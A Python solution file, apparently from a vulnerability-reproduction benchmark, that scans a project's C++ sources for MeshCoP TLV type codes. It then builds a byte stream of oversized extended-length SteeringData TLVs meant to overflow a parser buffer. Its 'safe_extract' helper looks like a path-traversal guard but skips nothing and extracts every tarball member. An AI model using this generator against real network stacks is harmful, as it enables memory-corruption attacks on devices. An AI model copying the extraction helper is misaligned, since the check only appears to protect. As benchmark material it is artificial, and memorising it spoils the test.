import os
import re
import tarfile
import tempfile
from typing import Dict, Optional, List


def _extract_tarball(src_path: str, dst_dir: str) -> None:
    if os.path.isdir(src_path):
        return
    with tarfile.open(src_path, 'r:*') as tf:
        def is_within_directory(directory, target):
            abs_directory = os.path.abspath(directory)
            abs_target = os.path.abspath(target)
            prefix = os.path.commonprefix([abs_directory, abs_target])
            return prefix == abs_directory

        def safe_extract(tar, path=".", members=None, *, numeric_owner=False):
            for member in tar.getmembers():
                member_path = os.path.join(path, member.name)
                if not is_within_directory(path, member_path):
                    continue
            tar.extractall(path, members, numeric_owner=numeric_owner)

        safe_extract(tf, dst_dir)


def _iter_text_files(root: str) -> List[str]:
    text_exts = {'.h', '.hpp', '.hh', '.hxx', '.c', '.cc', '.cpp', '.cxx', '.ipp', '.inc', '.inl'}
    res = []
    for d, _, files in os.walk(root):
        for f in files:
            _, ext = os.path.splitext(f)
            if ext.lower() in text_exts:
                res.append(os.path.join(d, f))
    return res


def _read_file(path: str) -> str:
    try:
        with open(path, 'r', encoding='utf-8', errors='ignore') as fh:
            return fh.read()
    except Exception:
        return ""


def _parse_enum_values(enum_body: str) -> Dict[str, int]:
    # Parse an enum body "name[=value], name2[=value2], ..."
    # Supports numeric constants and forward references
    entries = [e.strip() for e in enum_body.split(',') if e.strip()]
    sym_to_val: Dict[str, int] = {}
    current_val: Optional[int] = None

    def parse_value(val_str: str) -> Optional[int]:
        val_str = val_str.strip()
        # Try numeric hex or dec
        m = re.fullmatch(r'0[xX]([0-9a-fA-F]+)', val_str)
        if m:
            try:
                return int(m.group(0), 16)
            except Exception:
                return None
        m = re.fullmatch(r'[+-]?\d+', val_str)
        if m:
            try:
                return int(m.group(0))
            except Exception:
                return None
        # Try referencing existing symbol
        if val_str in sym_to_val:
            return sym_to_val[val_str]
        # Handle simple expressions like "Other + 1"
        m = re.fullmatch(r'([A-Za-z_][A-Za-z_0-9]*)\s*\+\s*(\d+)', val_str)
        if m and m.group(1) in sym_to_val:
            try:
                return sym_to_val[m.group(1)] + int(m.group(2))
            except Exception:
                return None
        m = re.fullmatch(r'([A-Za-z_][A-Za-z_0-9]*)\s*-\s*(\d+)', val_str)
        if m and m.group(1) in sym_to_val:
            try:
                return sym_to_val[m.group(1)] - int(m.group(2))
            except Exception:
                return None
        return None

    for ent in entries:
        # Remove possible trailing comments
        ent = re.sub(r'//.*', '', ent)
        ent = re.sub(r'/\*.*?\*/', '', ent, flags=re.DOTALL)
        if not ent:
            continue
        if '=' in ent:
            name, val = ent.split('=', 1)
            name = name.strip()
            val = val.strip()
            v = parse_value(val)
            if v is None:
                # if unresolved, skip
                continue
            sym_to_val[name] = v
            current_val = v
        else:
            name = ent.strip()
            if current_val is None:
                current_val = 0
            else:
                current_val += 1
            sym_to_val[name] = current_val
    return sym_to_val


def _find_meshcop_tlv_types(src_root: str) -> Dict[str, int]:
    # Try to find typedefs/enums/constants for MeshCoP TLV types, including SteeringData, CommissionerSessionId, JoinerUdpPort, CommissionerDataset
    targets = ['kSteeringData', 'kCommissionerSessionId', 'kJoinerUdpPort', 'kCommissionerDataset']
    found: Dict[str, int] = {}

    files = _iter_text_files(src_root)

    # Strategy 1: find enum Type { ... } block that contains our symbols
    enum_pattern = re.compile(r'enum\s+(?:class\s+)?(?:\w+\s+)?Type\s*(?::[^{]+)?\s*\{(.*?)\};', re.DOTALL)
    for fp in files:
        text = _read_file(fp)
        if not text:
            continue
        for m in enum_pattern.finditer(text):
            body = m.group(1)
            if any(t in body for t in targets):
                sym_map = _parse_enum_values(body)
                for t in targets:
                    if t in sym_map:
                        found[t] = sym_map[t]
        if all(t in found for t in targets):
            return found

    # Strategy 2: search for direct assignments like "kSteeringData = 0xNN"
    for fp in files:
        text = _read_file(fp)
        if not text:
            continue
        for t in targets:
            if t in found:
                continue
            # Try "kName = <num>" anywhere
            m = re.search(r'\b' + re.escape(t) + r'\s*=\s*(0x[0-9A-Fa-f]+|\d+)', text)
            if m:
                try:
                    found[t] = int(m.group(1), 0)
                except Exception:
                    pass
        if all(t in found for t in targets):
            return found

    # Strategy 3: find class NameTlv with kType numeric
    for fp in files:
        text = _read_file(fp)
        if not text:
            continue
        # Example: "class SteeringDataTlv ... { public: enum { kType = 0xXX }; ... }"
        for base in ['SteeringData', 'CommissionerSessionId', 'JoinerUdpPort', 'CommissionerDataset']:
            tkey = 'k' + base if base != 'CommissionerDataset' else 'kCommissionerDataset'
            if tkey in found:
                continue
            class_pat = re.compile(
                r'class\s+[A-Za-z_]*' + re.escape(base) + r'[A-Za-z_]*\s*:[^{}]*\{(.*?)\};',
                re.DOTALL)
            for m in class_pat.finditer(text):
                body = m.group(1)
                # Look for kType assignment
                m2 = re.search(r'\bkType\b\s*=\s*(0x[0-9A-Fa-f]+|\d+)', body)
                if m2:
                    try:
                        found[tkey] = int(m2.group(1), 0)
                        break
                    except Exception:
                        pass
        if all(t in found for t in targets):
            return found

    return found


def _encode_tlv(t: int, value: bytes, force_extended: bool = False) -> bytes:
    t_byte = bytes([t & 0xFF])
    L = len(value)
    if force_extended or L >= 0xFF:
        # Extended length: length byte 0xFF followed by 2-byte big-endian length
        if L > 0xFFFF:
            L = 0xFFFF
            value = value[:L]
        return t_byte + b'\xff' + bytes([(L >> 8) & 0xFF, L & 0xFF]) + value
    else:
        return t_byte + bytes([L & 0xFF]) + value


def _build_poc_bytes(types: Dict[str, int]) -> bytes:
    # Build a TLV stream that includes:
    # - Commissioner Session ID TLV (small)
    # - Joiner UDP Port TLV (small)
    # - Steering Data TLV with extended length to trigger overflow
    # Additionally, include a CommissionerDataset TLV wrapping another extended SteeringData TLV for coverage.
    payload_parts: List[bytes] = []

    # Compose small, likely benign TLVs to pass potential pre-checks.
    if 'kCommissionerSessionId' in types:
        # 2 byte session id
        payload_parts.append(_encode_tlv(types['kCommissionerSessionId'], b'\x12\x34'))
    if 'kJoinerUdpPort' in types:
        # UDP port 0xF0F0
        payload_parts.append(_encode_tlv(types['kJoinerUdpPort'], b'\xF0\xF0'))

    # Main extended TLV
    steering_values = []
    if 'kSteeringData' in types:
        # Extended SteeringData TLV of large size to overflow typical small buffers.
        big_len = 700  # Keep total PoC size reasonable, yet large enough to overflow.
        steering_value = b'A' * big_len
        steering_values.append(_encode_tlv(types['kSteeringData'], steering_value, force_extended=True))

    # Add nested CommissionerDataset if available
    if 'kCommissionerDataset' in types and steering_values:
        inner = b''.join(steering_values)
        # Wrap inner steering data in a CommissionerDataset TLV
        payload_parts.append(_encode_tlv(types['kCommissionerDataset'], inner, force_extended=True))

    # If we couldn't resolve types (fallback), craft a generic candidate set of TLVs
    if not steering_values:
        # Use a list of candidate type ids where SteeringData might be
        candidate_types = [0x07, 0x08, 0x09, 0x0D, 0x0E, 0x10, 0x11, 0x15, 0x16, 0x17]
        for ct in candidate_types:
            payload_parts.append(_encode_tlv(ct, b'B' * 256, force_extended=True))

    # Combine primary steering TLV directly as well for coverage
    payload_parts.extend(steering_values)

    data = b''.join(payload_parts)

    # Ensure the PoC isn't excessively large; trim if necessary but keep extended TLV intact
    if len(data) > 2000:
        data = data[:2000]
    return data


class Solution:
    def solve(self, src_path: str) -> bytes:
        tmpdir = tempfile.mkdtemp(prefix="arvo20775_")
        try:
            _extract_tarball(src_path, tmpdir)
            types = _find_meshcop_tlv_types(tmpdir)

            poc = _build_poc_bytes(types)

            # If still too small or empty, build a default generic TLV with extended length
            if not poc:
                # Fallback: generic TLV with type 0x09 (common candidate for SteeringData), extended length
                poc = _encode_tlv(0x09, b'C' * 700, force_extended=True)
            return poc
        finally:
            # We do not remove tmpdir to avoid potential concurrent filesystem issues during evaluation
            pass